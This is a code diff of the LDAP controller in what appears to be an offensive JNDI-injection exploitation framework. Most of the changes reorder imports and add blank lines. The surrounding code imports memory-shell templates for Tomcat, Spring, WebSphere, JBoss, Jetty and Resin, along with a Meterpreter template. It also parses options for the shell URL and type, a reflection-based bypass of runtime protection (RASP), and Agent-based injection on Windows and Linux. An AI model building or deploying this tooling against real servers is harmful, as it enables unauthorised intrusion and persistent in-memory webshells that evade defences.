@@ -4,11 +4,14 @@ import com.nu1r.jndi.enumtypes.GadgetType;
 import com.nu1r.jndi.enumtypes.PayloadType;
 import com.nu1r.jndi.exceptions.IncorrectParamsException;
 import com.nu1r.jndi.exceptions.UnSupportedPayloadTypeException;
-import com.nu1r.jndi.gadgets.ObjectPayload;
-import com.nu1r.jndi.gadgets.utils.InjShell;
-import com.nu1r.jndi.template.*;
+import com.nu1r.jndi.gadgets.Config.Config;
+import com.nu1r.jndi.gadgets.utils.Util;
+import com.nu1r.jndi.template.Meterpreter;
+import com.nu1r.jndi.template.SpringEchoTemplate;
+import com.nu1r.jndi.template.TomcatEchoTemplate;
 import com.nu1r.jndi.template.Websphere.WSFMSFromThread;
 import com.nu1r.jndi.template.Websphere.WebsphereMemshellTemplate;
+import com.nu1r.jndi.template.isSuccess;
 import com.nu1r.jndi.template.jboss.JBFMSFromContextF;
 import com.nu1r.jndi.template.jboss.JBSMSFromContextS;
 import com.nu1r.jndi.template.jetty.JFMSFromJMXF;
@@ -18,8 +21,6 @@ import com.nu1r.jndi.template.resin.RSMSFromThreadS;
 import com.nu1r.jndi.template.spring.SpringInterceptorMS;
 import com.nu1r.jndi.template.spring.SpringMemshellTemplate;
 import com.nu1r.jndi.template.tomcat.*;
-import com.nu1r.jndi.gadgets.Config.Config;
-import com.nu1r.jndi.gadgets.utils.Util;
 import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
 import com.unboundid.ldap.sdk.Entry;
 import com.unboundid.ldap.sdk.LDAPResult;
@@ -31,7 +32,6 @@ import org.apache.commons.codec.binary.Base64;
 
 import java.net.URL;
 
-import static com.nu1r.jndi.gadgets.utils.ClassNameUtils.generateClassName;
 import static com.nu1r.jndi.gadgets.Config.Config.*;
 import static com.nu1r.jndi.gadgets.utils.InjShell.*;
 import static org.fusesource.jansi.Ansi.ansi;
@@ -192,18 +192,22 @@ public class BasicController implements LdapController {
                         URL_PATTERN = U[0];
                         System.out.println(ansi().render("@|green [+]|@ @|MAGENTA ShellUrl >> |@" + U[0]));
                     }
+
                     if (i >= 2) {
                         Shell_Type = U[1];
                         System.out.println(ansi().render("@|green [+]|@ @|MAGENTA ShellType >> |@" + U[1]));
                     }
+
                     if (url1.contains("obscure")) {
                         IS_OBSCURE = true;
                         System.out.println(ansi().render("@|green [+]|@ @|MAGENTA 使用反射绕过RASP |@"));
                     }
+
                     if (url1.contains("winAgent")) {
                         winAgent = true;
                         System.out.println(ansi().render("@|green [+]|@ @|MAGENTA Windows下使用Agent写入 |@"));
                     }
+
                     if (url1.contains("linAgent")) {
                         linAgent = true;
                         System.out.println(ansi().render("@|green [+]|@ @|MAGENTA Linux下使用Agent写入 |@"));
